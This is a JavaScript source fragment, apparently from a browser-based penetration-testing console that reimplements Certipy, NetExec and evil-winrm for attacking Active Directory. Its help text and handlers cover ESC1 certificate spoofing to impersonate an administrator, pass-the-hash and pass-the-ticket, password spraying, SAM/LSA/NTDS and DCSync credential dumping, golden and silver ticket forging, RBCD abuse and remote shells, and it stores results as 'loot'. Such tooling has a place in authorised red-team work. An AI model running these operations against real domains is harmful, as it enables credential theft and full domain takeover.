      if (x.principalNames && x.principalNames.length) txt.push(`    Principals: ${x.principalNames.join(', ')}`);
    }
    this._saveResults([
      { name: `${base}.json`, content: JSON.stringify(jsonBlob, null, 2) },
      { name: `${base}.txt`, content: txt.join('\n') + '\n' },
    ]);
  }
  async _collector(runFn, a, usage) {
    const f = a.f;
    if (!f.host || !f.mode) return this.print(`usage: ${usage}`, 'err');
    const config = { ...this.ldapConfig(f), mode: f.mode, filter: f.filter, attributes: f.attributes };
    const res = await runFn(config, {
      log: (m) => this.print('  · ' + m),
      onRow: (r) => { if (r.dn) this.print(`${r.dn}\t${r.className || ''}`); },
    });
    if (res.summary) this.print('summary: ' + Object.entries(res.summary).map(([k, v]) => `${k}=${v}`).join(' '), 'ok');
    this._saveResults(res.files);
  }

  // Persist a tool's result files into the store under loot/ (instead of pushing
  // them straight to the browser downloads). Inspect with `cat`, export later
  // with `download`.
  _saveResults(files) {
    for (const file of files || []) {
      const path = this.store.put('loot/' + file.name, file.content);
      this.print(`[+] saved to store: ${path}  (download ${path} to export)`, 'ok');
    }
  }

  // ---- ldap-shell (interactive) ----
  async cmd_ldap_shell(a) {
    const ctx = await ldapConnect(this.ldapConfig(a.f), (m) => this.print('  · ' + m));
    const shell = new LdapShell(ctx.client, { baseDN: ctx.baseDN, domain: ctx.domain, tls: ctx.tls });
    this.print(`[+] LDAP shell on ${ctx.baseDN}. Type commands ("help"), or "exit".`, 'ok');
    this.io.setPrompt(`ldap(${ctx.domain})#`);
    this.active = {
      commands: shell.commands,
      handle: async (line) => { try { const out = await shell.run(line); if (out) this.print(out); } catch (e) { this.print('[!] ' + e.message, 'err'); } },
      close: () => ctx.client.close(),
    };
  }

  certipyHelp() {
    const H = (s) => this.print(s, 'ok');
    const L = (s) => this.print(s);
    L('');
    H('  certipy — AD CS enumeration + certificate request + PKINIT (à la Certipy)');
    L('');
    H('  ENUMERATE');
    L('    certipy find       -H <dc> -u <u> -d <d> -p <pw> [--tls]           enumerate every CA + template, ESC findings');
    L('    certipy vulnerable -H <dc> -u <u> -d <d> -p <pw> [--tls]           same, console shows only ESC-carrying items');
    L('    certipy templates  -H <dc> -u <u> -d <d> -p <pw> [-enabled]        templates only');
    L('    certipy cas        -H <dc> -u <u> -d <d> -p <pw>                   CAs only');
    L('       every find/vulnerable/templates/cas writes loot/certipy/<ts>_Certipy.{json,txt}');
    L('       -stdout    do not write files');
    L('       -enabled   restrict templates to those published by at least one CA');
    L('');
    H('  REQUEST CERTIFICATE');
    L('    certipy req -u <u> -d <d> -p <pw> --cahost <ca_host> -ca <CAName> -t <template>');
    L('                [-upn <upn>] [-dns <fqdn>] [-sid S-1-5-21-...] [-subject "CN=..."]');
    L('       writes loot/certipy/<ts>_<template>.{crt,key,pfx}   (pfx has no password)');
    L('       -upn / -dns  add a SubjectAltName (ESC1 spoof target)');
    L('       -sid         add the szOID_NTDS_CA_SECURITY_EXT SID extension —');
    L('                    only propagated by the CA when EDITF_ATTRIBUTESUBJECTALTNAME2');
    L('                    is set (ESC6), but it defeats KB5014754 strong mapping there');
    L('');
    H('  AUTHENTICATE (PKINIT)  →  TGT + UnPAC-the-hash');
    L('    certipy auth -u <u> -d <d> -pfx <store-path>              use an issued PFX (or its sibling .crt/.key)');
    L('    certipy auth -u <u> -d <d> -cert <path.crt> -key <path.key>');
    L('    certipy auth -u <u> -d <d> -p <pw> --cahost <ca_host> -ca <CAName> -t <template>');
    L('       request a fresh cert then PKINIT with it');
    L('       -k <kdc>       KDC host (default: -H / --cahost)');
    L('       -no-hash       skip UnPAC-the-hash (do PKINIT only)');
    L('       writes loot/certipy/<ts>_<user>.ccache  →  reuse with --ticket <path> in any LDAP-family / evil-winrm command');
    L('');
    H('  TICKET STORE');
    L('    klist <path>                            inspect a stored ccache/kirbi');
    L('    nxc smb dc -u u -d d --ticket loot/certipy/...ccache  ...  reuse for smb/ldap/winrm/mssql');
    L('    evil-winrm -H h -u u -d d --ticket loot/certipy/...ccache  ...  same');
    L('');
    H('  EXAMPLES');
    L('    certipy find       -H dc01.corp.local -u admin -d corp.local -p PASSWORD --tls');
    L('    certipy vulnerable -H dc01.corp.local -u admin -d corp.local -p PASSWORD --tls');
    L('    certipy req        -u lowpriv -d corp.local -p PASSWORD \\');
    L('                       --cahost ca01.corp.local -ca corp-CA -t VulnerableTemplate -upn administrator@corp.local');
    L('    certipy auth       -u administrator -d corp.local -pfx loot/certipy/<ts>_<template>.pfx');
  }

  nxcHelp() {
    const H = (s) => this.print(s, 'ok');
    const L = (s) => this.print(s);
    L('');
    H('  PROTOCOLS:');
    L('    smb      SMB2 enumeration & exploitation (port 445)');
    L('    ldap     LDAP/S directory queries (port 389/636)');
    L('    winrm    WinRM remote management (port 5985/5986)');
    L('    mssql    MS SQL Server (port 1433)');
    L('    ssh      SSH remote access (port 22)');
    L('    ftp      FTP file transfer (port 21)');
    L('    rdp      RDP screening & checks (port 3389)');
    L('    vnc      VNC screening (port 5900)');
    L('');
    H('  OPTIONS:');
    L('    -u, --user        Username(s) — space-separated for spraying');
    L('    -p, --password    Password(s) — space-separated for spraying');
    L('    -H, --hash        NT hash (pass-the-hash, LM:NT or NT)');
    L('    -d, --domain      Domain name');
    L('    -k, --kerberos    Use Kerberos auth');
    L('    --ticket PATH     Import a stored ccache/kirbi (smb, ldap, winrm, mssql) — pass-the-ticket');
    L('    --kdc             KDC host (default: target)');
    L('    --tls             Use TLS/SSL');
    L('    --port            Custom port');
    L('    -x, --exec        Execute command (for exec modules)');
    L('    -X                Execute PowerShell command');
    L('    --no-bruteforce   Pair user:pass 1:1 instead of all combos');
    L('    --continue-on-success  Keep trying after valid creds');
    L('    --timeout MS      Connection timeout in ms (default 10000)');
    L('    --jitter MS       Delay between attempts (lockout avoidance)');
    L('    -v               Verbose output (show info messages)');
    L('    -vv              Very verbose (show debug messages)');
    L('');
    H('  MODULES (--<module>):');
    L('    --auth            Authentication check (default)');
    L('    --shares          Enumerate SMB shares');
    L('    --sessions        Enumerate SMB sessions');
    L('    --logged-on       Enumerate logged-on users (wkssvc)');
    L('    --local-groups    Enumerate local group members (samr)');
    L('    --users           Enumerate users');
    L('    --groups          Enumerate groups');
    L('    --rid-brute [MAX] RID brute-force (SMB, default 4000)');
    L('    --sam-dump        Dump SAM hashes via registry (SMB)');
    L('    --lsa-dump        Dump LSA secrets + cached creds (SMB)');
    L('    --gpp             Extract GPP passwords from SYSVOL (SMB)');
    L('    --dcsync [USER]   DCSync via DRSUAPI replication (SMB)');
    L('    --ntds [USER]    Dump ntds.dit via VSS shadow copy (SMB)');
    L('    --signing         Check SMB/LDAP signing configuration');
    L('    --relay           Check NTLM relay + WebDAV status (SMB)');
    L('    --spooler         Check Print Spooler service (SMB)');
    L('    --petitpotam      Check EFS pipe for coercion (SMB)');
    L('    --webdav          Check WebClient/WebDAV service (SMB)');
    L('    --dfscoerce       Check DFS pipe for coercion (SMB)');
    L('    --shadowcoerce    Check FSS pipe for coercion (SMB)');
    L('    --coerce          All coercion checks at once (SMB)');
    L('    --smbghost        CVE-2020-0796 SMBGhost check (SMB)');
    L('    --zerologon      CVE-2020-1472 netlogon pipe check (SMB)');
    L('    --printnightmare CVE-2021-1675 PrintNightmare check (SMB)');
    L('    --ms17-010       Check for EternalBlue vulnerability (SMB)');
    L('    --bluekeep        CVE-2019-0708 BlueKeep check (RDP)');
    L('    --passwd USER PW  Force password change via SAMR (SMB)');
    L('    --atexec CMD     Execute via Task Scheduler (SMB)');
    L('    --wmi CMD        WMI exec via DCOM (SMB) or WinRM');
    L('    --wmi-query WQL  WMI query via WinRM');
    L('    --svc-start N    Start a service (SMB)');
    L('    --svc-stop N     Stop a service (SMB)');
    L('    --svc-status N   Query service status + config (SMB)');
    L('    --svc-create N P Create a service (SMB)');
    L('    --svc-delete N   Delete a service (SMB)');
    L('    --enum-av        Detect installed AV/EDR products (SMB)');
    L('    --os-info        Detailed OS/version/role info (SMB)');
    L('    --files [SHARE]  Scan for interesting files (SMB)');
    L('    --pipes          Enumerate accessible named pipes (SMB)');
    L('    --dialect        SMB dialect/signing/encryption (SMB)');
    L('    --epm            Enumerate RPC endpoints via port 135 (SMB)');
    L('    --golden-ticket  Forge golden ticket (--krbtgt, --domain-sid)');
    L('    --silver-ticket  Forge silver ticket (--service-hash, --domain-sid, --spn)');
    L('    --s4u            S4U delegation abuse (--impersonate, --target-spn)');
    L('    --dpapi          Decrypt DPAPI credential blobs (--master-key)');
    L('    --spider [SHARE] Spider a share (SMB, --pattern REGEX)');
    L('    --get PATH       Download file (SMB/WinRM/FTP)');
    L('    --put PATH DATA  Upload file (SMB/WinRM/FTP)');
    L('');
    L('    --computers      Enumerate computers (LDAP)');
    L('    --dcs            Enumerate domain controllers (LDAP)');
    L('    --spns           Enumerate SPN accounts (LDAP)');
    L('    --kerberoast     Find kerberoastable users (LDAP)');
    L('    --asrep          Find AS-REP roastable users (LDAP)');
    L('    --pass-pol       Dump password policy (LDAP)');
    L('    --laps           Read LAPS passwords (LDAP)');
    L('    --gmsa           Find gMSA accounts (LDAP)');
    L('    --delegation     Enumerate delegation settings (LDAP)');
    L('    --trusts         Enumerate domain trusts (LDAP)');
    L('    --adcs           Enumerate ADCS CAs and templates (LDAP)');
    L('    --maq            Read MachineAccountQuota (LDAP)');
    L('    --desc           Users with descriptions (LDAP)');
    L('    --admins         Enumerate privileged group members (LDAP)');
    L('    --fgpp           Fine-grained password policies (LDAP)');
    L('    --subnets        AD subnets and sites (LDAP)');
    L('    --ous            Enumerate OUs (LDAP)');
    L('    --gpos           Enumerate Group Policy Objects (LDAP)');
    L('    --dns            Enumerate DNS zones via LDAP');
    L('    --dacl           Dangerous ACL enumeration (LDAP)');
    L('    --nopac          CVE-2021-42278/42287 noPac check (LDAP)');
    L('    --shadow-creds   Shadow Credentials enumeration (LDAP)');
    L('    --bloodhound     BloodHound-compatible JSON export (LDAP)');
    L('    --search FILTER  Raw LDAP search');
    L('    --recon          Quick domain recon scan (LDAP)');
    L('    --add-computer N Create machine account via MAQ (LDAP)');
    L('    --del-computer N Delete machine account (LDAP)');
    L('    --rbcd ATK TGT   Write RBCD delegation (LDAP)');
    L('    --rbcd-clear TGT Clear RBCD delegation (LDAP)');
    L('    --changepwd U PW Change user password via LDAP');
    L('    --disable-user S Disable user account (LDAP)');
    L('    --enable-user S  Enable user account (LDAP)');
    L('    --add-member U G Add user to group (LDAP)');
    L('    --rm-member U G  Remove user from group (LDAP)');
    L('    --set-spn SAM S  Add SPN to account (LDAP)');
    L('    --clear-spn SAM S Remove SPN from account (LDAP)');
    L('    --set-desc SAM D Set description on AD object (LDAP)');
    L('    --set-asrep SAM  Set DONT_REQ_PREAUTH flag (LDAP)');
    L('    --clear-asrep SAM Clear DONT_REQ_PREAUTH flag (LDAP)');
    L('    --get-sid SAM    Resolve SID for sAMAccountName (LDAP)');
    L('    --passnotreqd    Accounts with PASSWD_NOTREQD flag (LDAP)');
    L('    --never-expires  Non-expiring passwords (LDAP)');
    L('    --obsolete       Legacy/obsolete computers (LDAP)');
    L('    --locked         Locked-out accounts (LDAP)');
    L('    --disabled       Disabled accounts (LDAP)');
    L('    --func-level     Domain/forest functional levels (LDAP)');
    L('    --rodc           Read-only domain controllers (LDAP)');
    L('    --pwd-expired    Expired passwords (LDAP)');
    L('    --protected-users Protected Users group (LDAP)');
    L('    --sensitive       NOT_DELEGATED accounts (LDAP)');
    L('    --exchange        Exchange servers (LDAP)');
    L('    --sccm            SCCM/MECM management points (LDAP)');
    L('    --stale-computers Inactive >90 days (LDAP)');
    L('    --admin-count     adminCount=1 accounts (LDAP)');
    L('    --svc-accounts    Service accounts with SPNs (LDAP)');
    L('    --trusted-deleg   Unconstrained delegation (LDAP)');
    L('    --sidhist         Accounts with SID history (LDAP)');
    L('    --machine-quota   Machine account quota (LDAP)');
    L('    --dns-zones       DNS zones (LDAP)');
    L('    --schema-version  AD schema & forest level (LDAP)');
    L('    --large-groups    Groups with >10 members (LDAP)');
    L('    --empty-pwd       No password set (LDAP)');
    L('    --pre-win2k       Pre-Windows 2000 group (LDAP)');
    L('    --pre2k           Pre-2000 computer password check (LDAP+SMB)');
    L('    --old-passwords   Password >1 year old (LDAP)');
    L('    --recycle-bin     AD Recycle Bin status (LDAP)');
    L('    --enterprise-admins Enterprise & Schema Admins (LDAP)');
    L('    --sites            AD sites & site links (LDAP)');
    L('    --managed-by       Groups with managers (LDAP)');
    L('    --dns-records [Z]  DNS records for zone (LDAP)');
    L('');
    L('    --ps CMD          PowerShell execution (WinRM)');
    L('    --sam             Dump SAM users (WinRM)');
    L('    --lsa             Dump local groups (WinRM)');
    L('    --sysinfo         System info (WinRM/SSH)');
    L('    --whoami          Whoami /all (WinRM/SSH/MSSQL)');
    L('    --procs           Process list (WinRM/SSH)');
    L('    --services        Running services (WinRM)');
    L('    --netstat         Network connections (WinRM/SSH)');
    L('    --av              AV status (WinRM)');
    L('    --reg-query KEY   Query registry key (WinRM)');
    L('    --env             Environment variables (WinRM/SSH)');
    L('    --disk            Disk info (WinRM)');
    L('    --software        Installed software (WinRM)');
    L('    --tasks           Scheduled tasks (WinRM)');
    L('    --firewall        Firewall profile status (WinRM/SSH)');
    L('    --domain-info     Domain/trust info (WinRM)');
    L('    --events [ID]     Security event log query (WinRM, default 4624)');
    L('    --privs           Token privileges (WinRM)');
    L('    --patches         Installed hotfixes (WinRM)');
    L('    --startup         Startup commands (WinRM)');
    L('    --drivers         Unsigned drivers (WinRM)');
    L('    --audit-pol       Audit policy settings (WinRM)');
    L('    --defender        Defender status & exclusions (WinRM)');
    L('    --local-admins    Local Administrators members (WinRM)');
    L('    --autorun         Autorun registry keys (WinRM)');
    L('    --token-privs     Token privileges (WinRM)');
    L('    --lsass           LSASS protection status (WinRM)');
    L('    --applocker       AppLocker configuration (WinRM)');
    L('    --bitlocker       BitLocker encryption status (WinRM)');
    L('    --cred-vault      Stored credentials (WinRM)');
    L('    --dotnet          .NET and PowerShell versions (WinRM)');
    L('    --wifi            WiFi profiles and keys (WinRM)');
    L('    --secrets         Credential hunting (WinRM/SSH)');
    L('    --uac             UAC configuration check (WinRM)');
    L('    --ps-history      PowerShell command history (WinRM)');
    L('');
    L('    --dbs             List databases (MSSQL)');
    L('    --links           List linked servers (MSSQL)');
    L('    --openquery SRV Q Execute query on linked server (MSSQL)');
    L('    --ole CMD         OLE Automation exec (MSSQL)');
    L('    --clr             Check/enable CLR assembly exec (MSSQL)');
    L('    --steal-hash UNC  Trigger UNC auth for hash stealing (MSSQL)');
    L('    --impersonate     Check impersonation privileges (MSSQL)');
    L('    --tables [DB]     List tables in database (MSSQL)');
    L('    --columns TABLE   List columns in table (MSSQL)');
    L('    --mssql-search K  Search columns by keyword (MSSQL)');
    L('    --logins          List server logins (MSSQL)');
    L('    --query SQL       Raw SQL query (MSSQL)');
    L('    --privesc         Check privilege escalation (MSSQL)');
    L('    --backups         Database backups (MSSQL)');
    L('    --jobs            SQL Agent jobs (MSSQL)');
    L('    --audit           Security audit (MSSQL)');
    L('    --credentials     SQL credentials (MSSQL)');
    L('    --triggers        Database & server triggers (MSSQL)');
    L('    --db-size         Database sizes (MSSQL)');
    L('');
    L('    --shadow          Dump /etc/shadow hashes (SSH, root)');
    L('    --keys            Enumerate SSH authorized_keys (SSH)');
    L('    --sudo            List sudo privileges (SSH)');
    L('    --crontab         Enumerate cron jobs (SSH)');
    L('    --suid            Find SUID binaries (SSH)');
    L('    --capabilities    Find files with capabilities (SSH)');
    L('    --writable        Find writable directories (SSH)');
    L('    --interfaces      Network interfaces (SSH)');
    L('    --docker          Docker containers/images/volumes (SSH)');
    L('    --portscan        Scan localhost ports via SSH pivot (SSH)');
    L('    --history         Shell history analysis (SSH)');
    L('    --configs         System config files (SSH)');
    L('    --screens         Screen/tmux sessions (SSH)');
    L('    --mounts          Mount points & NFS/CIFS shares (SSH)');
    L('    --packages        Installed packages & updates (SSH)');
    L('');
    L('    --anon            Test anonymous login (FTP)');
    L('    --ls [PATH]       Directory listing (FTP)');
    L('    --write-check     Test if FTP allows writes (FTP)');
    L('    --brute           Password brute-force (FTP/VNC/SSH/MSSQL)');
    L('    --banner          Grab service banner (FTP/SSH/RDP/VNC)');
    L('    --screen          Protocol screening (RDP/VNC)');
    L('    --nla             Check NLA requirement (RDP)');
    L('');
    H('  EXAMPLES:');
    L('    nxc smb 10.0.0.0/24 -u admin -p Pass123 -d corp.local');
    L('    nxc smb 10.0.0.1 -u admin -p Pass123 --shares');
    L('    nxc smb 10.0.0.1 -u admin -H 31d6cfe0d16ae931b73c59d7e0c089c0 --shares');
    L('    nxc smb 10.0.0.1 -u admin -p Pass123 -x "whoami"');
    L('    nxc smb 10.0.0.1 -u admin -p Pass123 --rid-brute');
    L('    nxc ldap 10.0.0.1 -u admin -p Pass123 -d corp.local --kerberoast');
    L('    nxc winrm 10.0.0.1 -u admin -p Pass123 --exec "ipconfig"');
    L('    nxc mssql 10.0.0.1 -u sa -p Pass123 --dbs');
    L('    nxc smb 10.0.0.0/24 -u admin user1 -p Pass1 Pass2 --auth');
    L('    nxc rdp 10.0.0.0/24 --screen');
    L('');
  }

  // ---- nxc (NetExec — multi-protocol) ----
  async cmd_nxc(_a, argv) {
    const { run } = await import('./tools/nxc/nxc.js');
    // Resolve --ticket <store-path> here (nxc can't reach the store) and strip it
    // from argv, then hand nxc the parsed ticket. Wired for ldap/smb; winrm is
    // pending an unrelated fix to its protocol→client wiring.
    let ticket = null;
    const ti = argv.findIndex((t) => t === '--ticket' || t === '-ticket');
    if (ti !== -1) { ticket = this.loadTicket(argv[ti + 1] || ''); argv = [...argv.slice(0, ti), ...argv.slice(ti + 2)]; }
    const LEVEL_CLS = { ok: 'ok', err: 'err', warn: 'warn', info: '', debug: '' };
    await run(argv, {
      emit: (level, proto, host, label, detail) => {
        const tag = `[${level === 'ok' ? '+' : level === 'err' ? '!' : '*'}]`;
        this.print(`${tag} ${proto.toUpperCase()} ${host}  ${label}${detail ? '  ' + detail : ''}`, LEVEL_CLS[level] || '');
      },
      print: (msg, cls) => this.print(msg, cls || ''),
    }, { ticket });
  }

  // ---- evil-winrm (interactive PowerShell) ----
  async cmd_evil_winrm(a) {
    const f = a.f;
    const ticket = f.ticket ? this.loadTicket(f.ticket) : null;
    const client = new WinRMClient((m) => this.print('  · ' + m));
    await client.connect(f.host, f.port ? +f.port : (f.tls ? 5986 : 5985), {
      authMethod: ticket ? 'kerberos' : (f.auth || 'ntlm'), user: f.user, domain: f.domain, kdc: f.kdc || null,
      tls: !!f.tls, sni: f.host, password: f.password, hash: f.hash || null, ticket,
    });
    const shell = new WinrmShell(client, (m) => this.print('  · ' + m));
    await shell.open();
    const prompt = () => this.io.setPrompt(`PS ${shell.pwd || ''}>`);
    this.print('[+] WinRM shell. Type commands, or "exit".', 'ok'); prompt();
    this.active = {
      handle: async (line) => {
        await shell.run(line, { onStdout: (t) => this.print(t.replace(/\n$/, '')), onStderr: (t) => this.print(t.replace(/\n$/, ''), 'err') });
        prompt();
      },
      close: async () => { try { await shell.close(); } catch { /* ignore */ } await client.close(); },
    };
  }
}
